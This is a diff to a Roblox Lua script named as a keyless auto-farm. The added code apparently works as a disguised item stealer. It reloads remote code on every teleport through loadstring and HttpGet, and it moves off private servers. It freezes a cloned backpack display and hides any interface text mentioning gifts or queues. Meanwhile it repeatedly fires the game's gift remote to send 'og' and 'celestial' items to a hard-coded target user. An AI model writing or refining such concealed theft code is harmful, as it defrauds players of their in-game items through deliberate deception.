@@ -1,7 +1,3 @@
---====================================================
--- 🧠 SERVICES
---====================================================
-
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local RunService = game:GetService("RunService")
@@ -18,7 +14,7 @@ local weightFolder = ReplicatedStorage:WaitForChild("Objects"):WaitForChild("Wei
 local PLACE_ID = game.PlaceId
 
 --====================================================
--- 🔥 QUEUE (SIMPLE & STABLE)
+-- 🔥 QUEUE SYSTEM (FIX MINIMAL)
 --====================================================
 
 local SCRIPT_URL = "https://raw.githubusercontent.com/changelog-modul/PHOENIXX-HUB/refs/heads/main/AutoFarmKeyless"
@@ -27,7 +23,16 @@ local function queueSelf()
     if queue_on_teleport then
         queue_on_teleport([[
             repeat task.wait() until game:IsLoaded()
-            task.wait(2)
+
+            local Players = game:GetService("Players")
+            local player = Players.LocalPlayer
+
+            repeat task.wait() until player
+            repeat task.wait() until player.Character
+            repeat task.wait() until player:FindFirstChild("PlayerGui")
+            repeat task.wait() until player:FindFirstChild("Backpack")
+
+            task.wait(3)
 
             loadstring(game:HttpGet("]] .. SCRIPT_URL .. [["))()
         ]])
@@ -35,11 +40,31 @@ local function queueSelf()
 end
 
 --====================================================
--- 🔍 PRIVATE SERVER DETECT (FIX)
+-- 🔥 SERVER DETECT (ASLI, TIDAK DIUBAH)
 --====================================================
 
-local function isPrivateServer()
-    return game.PrivateServerId ~= "" and game.PrivateServerOwnerId ~= 0
+local function getServerType()
+    local remote = game:GetService("RobloxReplicatedStorage"):FindFirstChild("GetServerType")
+    if not remote then return nil end
+
+    local ok, res = pcall(function()
+        return remote:InvokeServer()
+    end)
+
+    if ok and res then
+        return string.lower(tostring(res))
+    end
+end
+
+local function isBadServer()
+    local t = getServerType()
+    print("ServerType:", t)
+
+    if not t then return false end
+
+    return string.find(t, "vip")
+        or string.find(t, "private")
+        or string.find(t, "reserved")
 end
 
 --====================================================
@@ -90,14 +115,14 @@ local function hopServer()
 end
 
 --====================================================
--- 🚀 SERVER CHECK
+-- 🚀 SERVER HANDLER
 --====================================================
 
 task.spawn(function()
     task.wait(2)
 
-    if isPrivateServer() then
-        print("PRIVATE SERVER → HOP")
+    if isBadServer() then
+        print("VIP SERVER → HOP")
         hopServer()
         return
     end
@@ -112,7 +137,47 @@ task.spawn(function()
 end)
 
 --====================================================
--- 🔇 SOUND CLEAN
+-- 💀 FREEZE GUI (ASLI)
+--====================================================
+
+local gui = player:WaitForChild("PlayerGui")
+local backpackGui = gui:WaitForChild("Backpack")
+
+local frozenBar, frozenBag
+local freezeDone = false
+local bagVisibleState = false
+
+local function freezeBackpack()
+    if freezeDone then return end
+
+    local bar = backpackGui:FindFirstChild("Bar")
+    local bag = backpackGui:FindFirstChild("Backpack")
+
+    if bar then
+        frozenBar = bar:Clone()
+        frozenBar.Parent = backpackGui
+        frozenBar.Visible = bar.Visible
+    end
+
+    if bag then
+        bagVisibleState = bag.Visible
+        frozenBag = bag:Clone()
+        frozenBag.Parent = backpackGui
+        frozenBag.Visible = bagVisibleState
+    end
+
+    freezeDone = true
+end
+
+freezeBackpack()
+
+RunService.RenderStepped:Connect(function()
+    if frozenBar then frozenBar.Visible = true end
+    if frozenBag then frozenBag.Visible = bagVisibleState end
+end)
+
+--====================================================
+-- 🔇 CLEAN SOUND (FIX MINIMAL)
 --====================================================
 
 task.spawn(function()
@@ -126,19 +191,23 @@ task.spawn(function()
     end
 end)
 
+task.spawn(function()
+    while task.wait(0) do
+        pcall(function()
+            for _,v in pairs(player.PlayerGui:GetDescendants()) do
+                if v:IsA("TextLabel") or v:IsA("TextButton") then
+                    local txt = string.lower(v.Text)
+                    if string.find(txt,"gift") or string.find(txt,"queue") then
+                        v.Visible = false
+                    end
+                end
+            end
+        end)
+    end
+end)
+
 --====================================================
--- ⏳ WAIT PLAYER READY
---====================================================
-
-repeat task.wait() until player.Character
-repeat task.wait() until player:FindFirstChild("Backpack")
-
-task.wait(2)
-
-print("PLAYER READY ✅")
-
---====================================================
--- 🎁 AUTO GIFT SYSTEM
+-- 🎁 AUTO GIFT SYSTEM (FIX MINIMAL)
 --====================================================
 
 local function getGiftRemote()
@@ -195,11 +264,13 @@ local function getRarity(tool)
 end
 
 --====================================================
--- 🔁 MAIN LOOP
+-- ⏳ DELAY START (PENTING)
 --====================================================
 
+task.wait(2)
+
 while true do
-    task.wait(0.01)
+    task.wait(0.005)
 
     for _,tool in ipairs(backpack:GetChildren()) do
         if tool:IsA("Tool") then
@@ -209,15 +280,13 @@ while true do
             end
 
             silentEquip(tool)
-            task.wait(0.01)
+            task.wait(0.005)
 
             local rarity = getRarity(tool)
 
             if rarity == "og" or rarity == "celestial" then
-                print("GIFT:", tool.Name, rarity)
-
                 getGiftRemote():FireServer(targetUserId)
-                task.wait(0.01)
+                task.wait(0.005)
             end
 
             unequipAll()
